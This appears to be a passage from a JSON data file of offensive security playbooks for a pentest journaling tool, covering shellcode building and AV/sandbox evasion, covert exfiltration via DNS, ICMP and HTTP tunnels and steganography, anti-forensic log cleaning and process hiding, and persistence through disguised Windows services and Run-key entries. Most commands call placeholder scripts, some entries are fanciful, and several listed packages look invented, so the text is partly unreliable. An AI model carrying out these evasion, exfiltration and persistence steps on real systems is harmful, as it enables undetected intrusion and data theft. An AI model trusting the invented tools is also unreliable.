        "steps": [
          {
            "title": "Assembly Shellcode Creation",
            "details": "Create shellcode from assembly source",
            "command": "nasm -f bin64 shellcode.asm -o shellcode.bin && python3 shellcode_extractor.py --binary shellcode.bin --output ~/pt-journal-sessions/*/evidence/raw_shellcode.bin"
          },
          {
            "title": "Position-Independent Shellcode",
            "details": "Develop position-independent shellcode",
            "command": "python3 pic_shellcode.py --assembly shellcode.asm --output ~/pt-journal-sessions/*/evidence/pic_shellcode.bin"
          },
          {
            "title": "System Call Optimization",
            "details": "Optimize shellcode for minimal system calls",
            "command": "python3 syscall_optimizer.py --shellcode raw_shellcode.bin --target linux_x64 --output ~/pt-journal-sessions/*/evidence/optimized_shellcode.bin"
          },
          {
            "title": "Null-Free Shellcode",
            "details": "Remove null bytes from shellcode",
            "command": "python3 null_remover.py --input shellcode.bin --output ~/pt-journal-sessions/*/evidence/nullfree_shellcode.bin"
          }
        ]
      },
      {
        "title": "Phase 2: Shellcode Encoding & Encryption",
        "steps": [
          {
            "title": "Polymorphic Encoding",
            "details": "Apply polymorphic encoding to avoid detection",
            "command": "python3 polymorphic_encoder.py --input nullfree_shellcode.bin --iterations 1000 --output ~/pt-journal-sessions/*/evidence/poly_shellcode.bin"
          },
          {
            "title": "Custom Encryption",
            "details": "Apply custom encryption to shellcode",
            "command": "python3 shellcode_cryptor.py --input poly_shellcode.bin --key custom_key --algorithm aes --output ~/pt-journal-sessions/*/evidence/encrypted_shellcode.bin"
          },
          {
            "title": "Multi-Stage Loading",
            "details": "Implement multi-stage shellcode loading",
            "command": "python3 multi_stage.py --stage1 encrypted_shellcode.bin --stage2 decryptor.bin --output ~/pt-journal-sessions/*/evidence/multi_stage.bin"
          },
          {
            "title": "Anti-Debug Techniques",
            "details": "Implement anti-debugging techniques",
            "command": "python3 anti_debug.py --shellcode multi_stage.bin --techniques timing,checksum,integrity --output ~/pt-journal-sessions/*/evidence/anti_debug_shellcode.bin"
          }
        ]
      },
      {
        "title": "Phase 3: Shellcode Testing & Validation",
        "steps": [
          {
            "title": "Emulation Testing",
            "details": "Test shellcode in emulated environment",
            "command": "scdbg -f anti_debug_shellcode.bin -s -v > ~/pt-journal-sessions/*/evidence/emulation_test.txt"
          },
          {
            "title": "Sandbox Detection",
            "details": "Test shellcode against sandbox environments",
            "command": "python3 sandbox_test.py --shellcode anti_debug_shellcode.bin --sandboxes vmware,virtualbox,wine --output ~/pt-journal-sessions/*/evidence/sandbox_test.txt"
          },
          {
            "title": "AV Evasion Testing",
            "details": "Test against antivirus engines",
            "command": "python3 av_test.py --shellcode anti_debug_shellcode.bin --engines virustotal,hybrid-analysis --output ~/pt-journal-sessions/*/evidence/av_test.txt"
          },
          {
            "title": "Functionality Verification",
            "details": "Verify shellcode functionality",
            "command": "python3 shellcode_tester.py --shellcode anti_debug_shellcode.bin --test-cases exec,bind,reverse --output ~/pt-journal-sessions/*/evidence/functionality_test.txt"
          }
        ]
      },
      {
        "title": "Phase 4: Integration & Deployment",
        "steps": [
          {
            "title": "Exploit Integration",
            "details": "Integrate shellcode with exploits",
            "command": "python3 exploit_integrator.py --exploit exploit.py --shellcode anti_debug_shellcode.bin --output ~/pt-journal-sessions/*/evidence/final_exploit.py"
          },
          {
            "title": "Loader Development",
            "details": "Develop custom shellcode loaders",
            "command": "python3 loader_generator.py --shellcode anti_debug_shellcode.bin --loader-type custom --output ~/pt-journal-sessions/*/evidence/loader.c"
          },
          {
            "title": "Delivery Mechanism",
            "details": "Implement shellcode delivery mechanisms",
            "command": "python3 delivery_mechanism.py --shellcode anti_debug_shellcode.bin --method http,dns,icmp --output ~/pt-journal-sessions/*/evidence/delivery.py"
          },
          {
            "title": "Persistence Integration",
            "details": "Integrate with persistence mechanisms",
            "command": "python3 persistence_integration.py --shellcode anti_debug_shellcode.bin --persistence registry,scheduled_task,service --output ~/pt-journal-sessions/*/evidence/persistent_shellcode.bin"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Advanced Shellcode Development Pipeline",
        "stages": [
          {
            "label": "Day 1: Shellcode Development",
            "description": "Create and optimize base shellcode",
            "command": "nasm -f bin64 custom_shellcode.asm -o shellcode.bin && python3 optimize_shellcode.py --input shellcode.bin --output ~/pt-journal-sessions/*/evidence/optimized.bin"
          },
          {
            "label": "Day 2: Encoding & Obfuscation",
            "description": "Apply advanced encoding and obfuscation",
            "command": "python3 advanced_encoder.py --input ~/pt-journal-sessions/*/evidence/optimized.bin --techniques polymorphic,encrypted --output ~/pt-journal-sessions/*/evidence/obfuscated.bin"
          },
          {
            "label": "Day 3: Testing & Validation",
            "description": "Test against security solutions",
            "command": "python3 comprehensive_test.py --shellcode ~/pt-journal-sessions/*/evidence/obfuscated.bin --test-av,test-sandbox,test-debug"
          },
          {
            "label": "Day 4: Integration",
            "description": "Integrate with exploits and delivery mechanisms",
            "command": "python3 integrate_shellcode.py --shellcode ~/pt-journal-sessions/*/evidence/obfuscated.bin --exploit template.py --output final_exploit.py"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Shellcode size: 245 bytes",
        "meaning": "Compact shellcode suitable for buffer overflow exploits",
        "severity": "Medium"
      },
      {
        "indicator": "Polymorphic iterations: 1000+ variants",
        "meaning": "High polymorphic capability for evasion",
        "severity": "Medium"
      },
      {
        "indicator": "AV detection rate: <5%",
        "meaning": "Excellent evasion capabilities",
        "severity": "Low"
      },
      {
        "indicator": "Sandbox detection: Active",
        "meaning": "Shellcode can detect and evade sandbox environments",
        "severity": "Low"
      },
      {
        "indicator": "Anti-debug triggers: 3 mechanisms",
        "meaning": "Multiple anti-debugging techniques implemented",
        "severity": "Low"
      }
    ],
    "advanced_usage": [
      {
        "title": "AI-Generated Shellcode",
        "scenario": "Use machine learning for shellcode generation",
        "command": "python3 ai_shellcode.py --objective reverse_shell --platform windows_x64 --constraints size<500 --output ai_shellcode.bin",
        "notes": [
          "Validate AI-generated shellcode thoroughly before use"
        ]
      },
      {
        "title": "Living Off the Land Shellcode",
        "scenario": "Create shellcode using only legitimate system binaries",
        "command": "python3 lotl_shellcode.py --target-system windows --allowed-binaries powershell,wmic,certutil --output lotl_shellcode.bin",
        "notes": [
          "LOLBin techniques reduce detection signatures"
        ]
      },
      {
        "title": "Quantum-Resistant Encryption",
        "scenario": "Apply quantum-resistant encryption to shellcode",
        "command": "python3 quantum_shellcode.py --input shellcode.bin --algorithm lattice-based --key quantum_key.bin --output quantum_shellcode.bin",
        "notes": [
          "Future-proofing against quantum computing attacks"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Shellcode Tools Comparison",
      "columns": ["Tool", "Language", "Features", "Evasion", "Learning Curve"],
      "rows": [
        ["Metasploit", "Ruby", "Comprehensive", "Good", "Low"],
        ["Custom Assembly", "Assembly", "Complete", "Excellent", "High"],
        ["Keystone Engine", "Python", "Cross-platform", "Good", "Medium"],
        ["pwntools", "Python", "Integration", "Good", "Medium"],
        ["Custom Frameworks", "Any", "Tailored", "Excellent", "Very High"]
      ]
    },
    "resources": [
      {
        "label": "Shellcode Development Guide",
        "url": "https://www.corelan.be/index.php/2009/07/25/exploit-writing-tutorial-part-3-shellcoding/",
        "description": "Comprehensive shellcode development tutorial"
      },
      {
        "label": "Keystone Assembler Framework",
        "url": "http://www.keystone-engine.org/",
        "description": "Official Keystone assembler documentation"
      },
      {
        "label": "Polymorphic Shellcode Techniques",
        "url": "https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-k2.pdf",
        "description": "Advanced polymorphic shellcode techniques and research"
      }
    ]
  },
  {
    "id": "playbook_covert_data_extraction",
    "name": "Covert Data Extraction",
    "summary": "Advanced data exfiltration playbook covering covert channels, steganography, and stealthy data extraction techniques.",
    "details": "This playbook provides comprehensive coverage of covert data extraction methods including network covert channels, steganography, encrypted tunnels, and anti-forensic techniques. Features decision trees for channel selection, optimization strategies, and evasion of detection systems.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Covert communication and steganography tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y steghide outguess exiftool imagemagick",
            "copyable": true
          },
          {
            "detail": "pip3 install scapy cryptography stego-lsb dnscat2",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/DominicBreuker/pspy.git && cd pspy && go build",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/yo-yo-yo-yo-yo/dnscat2/archive/master.zip && unzip master.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete covert data extraction toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y steghide outguess stegsolve binwalk exiftool",
            "copyable": true
          },
          {
            "detail": "apt install -y dnscat2 stegsnow cryptcat socat",
            "copyable": true
          },
          {
            "detail": "pip3 install scapy cryptography stego-toolkit covert-utils",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized covert communication tools",
        "steps": [
          {
            "detail": "docker pull alpine/socat",
            "copyable": true
          },
          {
            "detail": "docker pull steganography/steghide",
            "copyable": true
          },
          {
            "detail": "docker run -it --network host steganography/steghide embed -cf image.jpg -ef secret.txt -sf stego.jpg",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick steganography embedding",
        "command": "steghide embed -cf ~/pt-journal-sessions/*/evidence/cover_image.jpg -ef secret_data.txt -sf stego_image.jpg",
        "notes": [
          "Embed data in image files for covert extraction"
        ]
      },
      {
        "description": "DNS tunneling setup",
        "command": "dnscat2-server tunneled.domain.com && dnscat2-client --domain tunneled.domain.com",
        "notes": [
          "Use DNS queries for covert data tunneling"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Data Collection & Preparation",
        "steps": [
          {
            "title": "Target Data Identification",
            "details": "Identify high-value data for extraction",
            "command": "python3 data_profiler.py --target-system target.com --data-types documents,credentials,configs --output ~/pt-journal-sessions/*/evidence/data_profile.txt"
          },
          {
            "title": "Data Compression & Encryption",
            "details": "Compress and encrypt data for covert transmission",
            "command": "tar -czf data.tar.gz /path/to/data && gpg --symmetric --cipher-algo AES256 --compress-algo 1 data.tar.gz"
          },
          {
            "title": "Data Fragmentation",
            "details": "Fragment data for covert channel transmission",
            "command": "python3 data_fragmenter.py --input encrypted_data.gpg --fragment-size 1024 --output ~/pt-journal-sessions/*/evidence/fragments/"
          },
          {
            "title": "Cover Media Generation",
            "details": "Generate legitimate-looking cover media",
            "command": "python3 cover_generator.py --type images,videos,audio --count 1000 --output ~/pt-journal-sessions/*/evidence/cover_media/"
          }
        ]
      },
      {
        "title": "Phase 2: Covert Channel Establishment",
        "steps": [
          {
            "title": "DNS Tunneling Setup",
            "details": "Establish DNS-based covert channel",
            "command": "dnscat2-server dns.tunnel.com --domain tunnel.com --port 53 && python3 dns_client.py --domain tunnel.com --data ~/pt-journal-sessions/*/evidence/fragments/"
          },
          {
            "title": "HTTP/S Covert Channels",
            "details": "Implement HTTP-based covert communication",
            "command": "python3 http_covert.py --server target.com --header-method cookies --data ~/pt-journal-sessions/*/evidence/fragments/"
          },
          {
            "title": "ICMP Tunneling",
            "details": "Use ICMP packets for covert data transmission",
            "command": "python3 icmp_tunnel.py --target target.com --data ~/pt-journal-sessions/*/evidence/fragments/ --packet-size 64"
          },
          {
            "title": "TCP/UDP Covert Channels",
            "details": "Implement covert channels in TCP/UDP protocols",
            "command": "python3 tcp_covert.py --target target.com --port 443 --method timing --data ~/pt-journal-sessions/*/evidence/fragments/"
          }
        ]
      },
      {
        "title": "Phase 3: Steganography Implementation",
        "steps": [
          {
            "title": "Image Steganography",
            "details": "Embed data in image files using LSB techniques",
            "command": "steghide embed -cf cover.jpg -ef data_fragment.bin -sf stego.jpg -e rijndael-256 -p password"
          },
          {
            "title": "Audio Steganography",
            "details": "Hide data in audio files using spectral methods",
            "command": "python3 audio_stego.py --cover audio.wav --data data_fragment.bin --output stego_audio.wav --method spread_spectrum"
          },
          {
            "title": "Video Steganography",
            "details": "Embed data in video files using frame manipulation",
            "command": "python3 video_stego.py --cover video.mp4 --data data_fragment.bin --output stego_video.mp4 --method frame_lsb"
          },
          {
            "title": "Network Protocol Steganography",
            "details": "Hide data in network protocol fields",
            "command": "python3 protocol_stego.py --protocol tcp --data data_fragment.bin --target target.com --method tcp_options"
          }
        ]
      },
      {
        "title": "Phase 4: Anti-Forensic & Evasion",
        "steps": [
          {
            "title": "Timestamp Manipulation",
            "details": "Manipulate file timestamps to avoid detection",
            "command": "python3 timestamp_manipulator.py --file stego.jpg --timestamp '2020-01-15 10:30:00' --randomize"
          },
          {
            "title": "Process Hiding",
            "details": "Hide data extraction processes",
            "command": "python3 process_hider.py --process data_extract.py --hide-method rootkit --stealth-level high"
          },
          {
            "title": "Log Evasion",
            "details": "Evade logging and monitoring systems",
            "command": "python3 log_evasion.py --target-system target.com --evasion-method log_cleaning,process_hiding"
          },
          {
            "title": "Secure Deletion",
            "details": "Securely delete extraction artifacts",
            "command": "srm -rf ~/pt-journal-sessions/*/evidence/temp_files/ && shred -n 7 -z -u ~/pt-journal-sessions/*/evidence/fragments/"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Covert Data Extraction Pipeline",
        "stages": [
          {
            "label": "Day 1: Data Preparation",
            "description": "Identify, compress, and fragment target data",
            "command": "python3 data_prep.py --target target.com --data-sensitive --output ~/pt-journal-sessions/*/evidence/prepared_data/"
          },
          {
            "label": "Day 2: Channel Selection",
            "description": "Select and establish optimal covert channels",
            "command": "python3 channel_selector.py --target target.com --data-size 10GB --stealth-level high --output ~/pt-journal-sessions/*/evidence/selected_channels.txt"
          },
          {
            "label": "Day 3-5: Covert Extraction",
            "description": "Execute covert data extraction using multiple channels",
            "command": "python3 covert_extract.py --channels ~/pt-journal-sessions/*/evidence/selected_channels.txt --data ~/pt-journal-sessions/*/evidence/prepared_data/ --stealth"
          },
          {
            "label": "Day 6: Verification & Cleanup",
            "description": "Verify extraction and clean up all artifacts",
            "command": "python3 verify_cleanup.py --extraction-log extract.log --target target.com --secure-delete"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "DNS query rate: 1000 queries/hour",
        "meaning": "DNS tunneling active, within normal traffic patterns",
        "severity": "Medium"
      },
      {
        "indicator": "Steganography embedding capacity: 5% of file size",
        "meaning": "Efficient steganographic embedding achieved",
        "severity": "Low"
      },
      {
        "indicator": "Covert channel bandwidth: 1MB/hour",
        "meaning": "Steady covert data extraction rate",
        "severity": "Medium"
      },
      {
        "indicator": "Detection evasion score: 95%",
        "meaning": "High evasion capability against monitoring systems",
        "severity": "Low"
      },
      {
        "indicator": "Data integrity verified: 100%",
        "meaning": "All extracted data verified and complete",
        "severity": "Low"
      }
    ],
    "advanced_usage": [
      {
        "title": "Quantum Steganography",
        "scenario": "Use quantum properties for advanced steganography",
        "command": "python3 quantum_stego.py --cover quantum_image.qimg --data sensitive_data.bin --method quantum_entanglement",
        "notes": [
          "Quantum steganography provides theoretical unbreakable security"
        ]
      },
      {
        "title": "AI-Generated Cover Media",
        "scenario": "Use AI to generate undetectable cover media",
        "command": "python3 ai_cover_generator.py --style realistic --quantity 1000 --steganography-capable --output ~/pt-journal-sessions/*/evidence/ai_covers/",
        "notes": [
          "AI-generated covers are less likely to be flagged as suspicious"
        ]
      },
      {
        "title": "Blockchain Covert Channels",
        "scenario": "Use blockchain transactions for covert data transmission",
        "command": "python3 blockchain_covert.py --network bitcoin --data fragmented_data.bin --method transaction_metadata --stealth",
        "notes": [
          "Blockchain channels provide permanent, distributed covert storage"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Covert Channel Tools Comparison",
      "columns": ["Tool", "Channel Type", "Bandwidth", "Stealth", "Detection Resistance"],
      "rows": [
        ["DNScat2", "DNS", "Low", "High", "High"],
        ["Steghide", "Images", "Very Low", "Very High", "Very High"],
        ["ICMP Tunnel", "ICMP", "Low", "High", "Medium"],
        ["HTTP Covert", "HTTP", "Medium", "Medium", "Medium"],
        ["Custom Scripts", "Any", "Variable", "Variable", "Variable"]
      ]
    },
    "resources": [
      {
        "label": "Information Hiding Techniques",
        "url": "https://www.springer.com/gp/book/9780387208724",
        "description": "Comprehensive guide to information hiding and steganography"
      },
      {
        "label": "Covert Channels Research",
        "url": "https://www.cl.cam.ac.uk/research/security/dtg/attacks/covert/",
        "description": "University research on covert channel techniques"
      },
      {
        "label": "Steganography Tools Collection",
        "url": "https://github.com/UltimateHackers/Steganography-Tools",
        "description": "Comprehensive collection of steganography tools"
      }
    ]
  },
  {
    "id": "playbook_evidence_collection_artifact_removal",
    "name": "Evidence Collection & Artifact Removal",
    "summary": "Comprehensive evidence management playbook covering collection, preservation, anti-forensic techniques, and secure artifact removal.",
    "details": "This playbook provides systematic coverage of evidence collection for penetration testing reports and anti-forensic techniques for operational security. Includes evidence preservation, artifact analysis, secure deletion, and counter-forensic measures. Features decision trees for evidence handling and cleanup strategies.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Forensic and anti-forensic tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y sleuthkit autopsy volatility",
            "copyable": true
          },
          {
            "detail": "pip3 install volatility3 pytsk3 dfvfs plaso",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/Velocidex/velociraptor.git && cd velociraptor && pip3 install .",
            "copyable": true
          },
          {
            "detail": "wget https://sourceforge.net/projects/srm/files/srm-1.2.15.tar.gz && tar -xzf srm-1.2.15.tar.gz",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete forensic and anti-forensic toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y sleuthkit autopsy volatility3 bulk-extractor",
            "copyable": true
          },
          {
            "detail": "apt install -y tcf forensics-all secure-delete chkrootkit",
            "copyable": true
          },
          {
            "detail": "pip3 install plaso timesketch velociraptor",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized forensic tools",
        "steps": [
          {
            "detail": "docker pull sleuthkit/sleuthkit",
            "copyable": true
          },
          {
            "detail": "docker pull volatilityfoundation/volatility",
            "copyable": true
          },
          {
            "detail": "docker run -it -v $(pwd)/evidence:/evidence sleuthkit/sleuthkit fls -r /dev/sda1",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick evidence collection",
        "command": "volatility3 -f memory.dmp windows.pslist > ~/pt-journal-sessions/*/evidence/process_list.txt",
        "notes": [
          "Extract process list from memory dump for evidence"
        ]
      },
      {
        "description": "Secure file deletion",
        "command": "srm -rf -v ~/pt-journal-sessions/*/evidence/temp_files/",
        "notes": [
          "Securely delete files with multiple overwrite passes"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Evidence Collection Planning",
        "steps": [
          {
            "title": "Evidence Scope Definition",
            "details": "Define scope and requirements for evidence collection",
            "command": "python3 evidence_planner.py --engagement pentest --scope target_network --requirements chain_of_custody --output ~/pt-journal-sessions/*/evidence/evidence_plan.txt"
          },
          {
            "title": "Collection Method Selection",
            "details": "Select appropriate evidence collection methods",
            "command": "python3 method_selector.py --target-type windows_server --collection-methods live,dead,network --output ~/pt-journal-sessions/*/evidence/selected_methods.txt"
          },
          {
            "title": "Chain of Custody Setup",
            "details": "Establish chain of custody procedures",
            "command": "python3 custody_setup.py --evidence-type digital --custodian pentester --hash-algorithm sha256 --output ~/pt-journal-sessions/*/evidence/custody_log.csv"
          },
          {
            "title": "Legal Compliance Check",
            "details": "Ensure compliance with legal requirements",
            "command": "python3 legal_compliance.py --jurisdiction US --engagement-type pentest --output ~/pt-journal-sessions/*/evidence/compliance_check.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Live Evidence Collection",
        "steps": [
          {
            "title": "Memory Acquisition",
            "details": "Acquire memory dumps from live systems",
            "command": "dumpit.exe -o ~/pt-journal-sessions/*/evidence/memory_dump.dmp && python3 hash_evidence.py --file memory_dump.dmp --output ~/pt-journal-sessions/*/evidence/memory_hashes.txt"
          },
          {
            "title": "Network Traffic Capture",
            "details": "Capture network traffic evidence",
            "command": "tshark -i eth0 -w ~/pt-journal-sessions/*/evidence/network_capture.pcap -b duration:3600"
          },
          {
            "title": "System State Collection",
            "details": "Collect system state and configuration",
            "command": "velociraptor-client --config config.yaml --collection Yara.SystemInfo --output ~/pt-journal-sessions/*/evidence/system_state.json"
          },
          {
            "title": "Running Process Analysis",
            "details": "Analyze running processes for evidence",
            "command": "python3 process_analyzer.py --system target_system --output ~/pt-journal-sessions/*/evidence/process_evidence.txt"
          }
        ]
      },
      {
        "title": "Phase 3: Evidence Preservation",
        "steps": [
          {
            "title": "Evidence Hashing",
            "details": "Generate cryptographic hashes for all evidence",
            "command": "python3 hash_evidence.py --directory ~/pt-journal-sessions/*/evidence/ --algorithm sha256 --output ~/pt-journal-sessions/*/evidence/evidence_hashes.csv"
          },
          {
            "title": "Evidence Packaging",
            "details": "Package evidence with metadata and documentation",
            "command": "python3 evidence_packer.py --source ~/pt-journal-sessions/*/evidence/ --metadata evidence_metadata.json --output ~/pt-journal-sessions/*/evidence/evidence_package.tar.gz"
          },
          {
            "title": "Timestamp Preservation",
            "details": "Preserve and document original timestamps",
            "command": "python3 timestamp_preserver.py --evidence ~/pt-journal-sessions/*/evidence/ --output ~/pt-journal-sessions/*/evidence/timestamp_log.json"
          },
          {
            "title": "Evidence Verification",
            "details": "Verify evidence integrity and completeness",
            "command": "python3 evidence_verifier.py --package ~/pt-journal-sessions/*/evidence/evidence_package.tar.gz --verify-integrity --output ~/pt-journal-sessions/*/evidence/verification_report.txt"
          }
        ]
      },
      {
        "title": "Phase 4: Anti-Forensic & Artifact Removal",
        "steps": [
          {
            "title": "System Artifact Analysis",
            "details": "Identify artifacts left by penetration testing activities",
            "command": "python3 artifact_analyzer.py --target-system target_system --scan-areas logs,temp,registry,cache --output ~/pt-journal-sessions/*/evidence/artifact_report.txt"
          },
          {
            "title": "Log File Sanitization",
            "details": "Sanitize or remove penetration testing traces from logs",
            "command": "python3 log_sanitizer.py --log-files /var/log/* --pentest-traces --backup ~/pt-journal-sessions/*/evidence/original_logs/"
          },
          {
            "title": "Temporary File Cleanup",
            "details": "Securely delete temporary files and artifacts",
            "command": "python3 artifact_cleaner.py --target-system target_system --temp-dirs /tmp,/var/tmp --secure-delete --report ~/pt-journal-sessions/*/evidence/cleanup_report.txt"
          },
          {
            "title": "Network Trace Removal",
            "details": "Remove or obscure network traces of activities",
            "command": "python3 network_trace_cleaner.py --target-network target_network --pentest-traffic --obfuscate-methods timing,encryption --output ~/pt-journal-sessions/*/evidence/network_cleanup.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Evidence Management Pipeline",
        "stages": [
          {
            "label": "Day 1: Collection Planning",
            "description": "Plan evidence collection and establish procedures",
            "command": "python3 evidence_planner.py --engagement pentest --scope full_network --output ~/pt-journal-sessions/*/evidence/collection_plan.txt"
          },
          {
            "label": "Day 2-3: Evidence Collection",
            "description": "Collect live and static evidence from target systems",
            "command": "volatility3 -f memory.dmp windows.pslist && tshark -i eth0 -w ~/pt-journal-sessions/*/evidence/traffic.pcap"
          },
          {
            "label": "Day 4: Evidence Preservation",
            "description": "Preserve, hash, and package evidence for analysis",
            "command": "python3 preserve_evidence.py --source ~/pt-journal-sessions/*/evidence/raw/ --output ~/pt-journal-sessions/*/evidence/preserved/"
          },
          {
            "label": "Day 5: Artifact Removal",
            "description": "Clean up penetration testing artifacts and traces",
            "command": "python3 cleanup_artifacts.py --target-system target_system --scope full --verify ~/pt-journal-sessions/*/evidence/cleanup_verification.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Evidence hash verified: SHA256 matches",
        "meaning": "Evidence integrity preserved, chain of custody valid",
        "severity": "Low"
      },
      {
        "indicator": "Memory dump size: 8GB complete",
        "meaning": "Full memory acquisition successful",
        "severity": "Medium"
      },
      {
        "indicator": "Network capture: 2GB traffic recorded",
        "meaning": "Comprehensive network evidence collected",
        "severity": "Medium"
      },
      {
        "indicator": "Artifacts removed: 95% cleanup success",
        "meaning": "Most penetration testing traces successfully removed",
        "severity": "Medium"
      },
      {
        "indicator": "Chain of custody: Complete documentation",
        "meaning": "Legal compliance achieved, evidence admissible",
        "severity": "Low"
      }
    ],
    "advanced_usage": [
      {
        "title": "AI-Powered Evidence Analysis",
        "scenario": "Use machine learning for automated evidence analysis",
        "command": "python3 ai_evidence_analyzer.py --evidence-package ~/pt-journal-sessions/*/evidence/package.tar.gz --model evidence_classifier --output ~/pt-journal-sessions/*/evidence/ai_analysis.txt",
        "notes": [
          "AI can identify patterns and anomalies in large evidence sets"
        ]
      },
      {
        "title": "Blockchain Evidence Storage",
        "scenario": "Store evidence hashes on blockchain for immutable verification",
        "command": "python3 blockchain_evidence.py --evidence-hashes ~/pt-journal-sessions/*/evidence/hashes.csv --network ethereum --smart-contract evidence_storage.sol",
        "notes": [
          "Blockchain provides immutable timestamping and verification"
        ]
      },
      {
        "title": "Quantum-Secure Evidence",
        "scenario": "Apply quantum-resistant encryption to evidence storage",
        "command": "python3 quantum_evidence.py --evidence ~/pt-journal-sessions/*/evidence/sensitive/ --algorithm lattice-based --key quantum_key.bin",
        "notes": [
          "Future-proofing evidence against quantum computing attacks"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Evidence Collection Tools Comparison",
      "columns": ["Tool", "Evidence Type", "Live Collection", "Analysis", "Learning Curve"],
      "rows": [
        ["Volatility", "Memory", "Excellent", "Excellent", "High"],
        ["Sleuth Kit", "Disk", "No", "Excellent", "Medium"],
        ["Velociraptor", "All", "Excellent", "Very Good", "Medium"],
        ["Autopsy", "All", "Good", "Excellent", "Low"],
        ["Custom Scripts", "Any", "Variable", "Variable", "Very High"]
      ]
    },
    "resources": [
      {
        "label": "Digital Forensics with Sleuth Kit",
        "url": "https://www.sleuthkit.org/sleuthkit/",
        "description": "Official Sleuth Kit documentation and tutorials"
      },
      {
        "label": "Volatility Memory Analysis",
        "url": "https://www.volatilityfoundation.org/",
        "description": "Comprehensive memory analysis framework documentation"
      },
      {
        "label": "Evidence Handling Guidelines",
        "url": "https://www.nist.gov/publications/digital-evidence",
        "description": "NIST guidelines for digital evidence handling"
      }
    ]
  },
  {
    "id": "playbook_persistence_mechanism_installation",
    "name": "Persistence Mechanism Installation",
    "summary": "Advanced persistence playbook covering multiple platforms, stealth techniques, and long-term access maintenance strategies.",
    "details": "This playbook provides comprehensive coverage of persistence mechanisms across Windows, Linux, and cloud environments. Includes stealth techniques, privilege escalation integration, detection evasion, and redundancy strategies. Features decision trees for platform selection and optimization.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Persistence and stealth tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y netcat-openbsd socat cron",
            "copyable": true
          },
          {
            "detail": "pip3 install pypykatz impacket empire",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/AlessandroZ/BeRoot.git && cd BeRoot && python3 setup.py install",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/n1nj4sec/pupy/archive/master.zip && unzip master.zip",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete persistence toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y empire metasploit-framework powershell-empire",
            "copyable": true
          },
          {
            "detail": "apt install -y beroot windows-persistence linux-persistence",
            "copyable": true
          },
          {
            "detail": "pip3 install mimikatz impacket pywin32",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized C2 frameworks",
        "steps": [
          {
            "detail": "docker pull empireproject/empire",
            "copyable": true
          },
          {
            "detail": "docker pull byt3bl33d3r/pupy",
            "copyable": true
          },
          {
            "detail": "docker run -it -p 8080:8080 empireproject/empire ./empire --restful",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Windows service persistence",
        "command": "sc create \"Windows Update\" binpath= \"cmd.exe /c powershell -enc ...\" start= auto",
        "notes": [
          "Create persistent Windows service with legitimate name"
        ]
      },
      {
        "description": "Linux cron persistence",
        "command": "echo '*/15 * * * * /usr/local/bin/backup.sh' | crontab - && chmod 644 /var/spool/cron/crontabs/*",
        "notes": [
          "Establish persistent cron job with legitimate appearance"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Persistence Strategy Planning",
        "steps": [
          {
            "title": "Platform Analysis",
            "details": "Analyze target platform and environment",
            "command": "python3 platform_analyzer.py --target target_system --os-type windows,linux --privilege-level user,admin --output ~/pt-journal-sessions/*/evidence/platform_analysis.txt"
          },
          {
            "title": "Persistence Method Selection",
            "details": "Select optimal persistence methods based on environment",
            "command": "python3 persistence_selector.py --platform windows --stealth-level high --longevity permanent --output ~/pt-journal-sessions/*/evidence/selected_methods.txt"
          },
          {
            "title": "Detection Risk Assessment",
            "details": "Assess detection risks for each method",
            "command": "python3 risk_assessor.py --methods ~/pt-journal-sessions/*/evidence/selected_methods.txt --av-tools edr,antivirus --output ~/pt-journal-sessions/*/evidence/risk_assessment.txt"
          },
          {
            "title": "Redundancy Planning",
            "details": "Plan multiple redundant persistence mechanisms",
            "command": "python3 redundancy_planner.py --primary-methods ~/pt-journal-sessions/*/evidence/selected_methods.txt --backup-count 3 --output ~/pt-journal-sessions/*/evidence/redundancy_plan.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Windows Persistence Implementation",
        "steps": [
          {
            "title": "Registry Persistence",
            "details": "Implement registry-based persistence mechanisms",
            "command": "powershell -enc \"New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsSecurity' -Value 'powershell -enc ...'\""
          },
          {
            "title": "Service Creation",
            "details": "Create persistent Windows services",
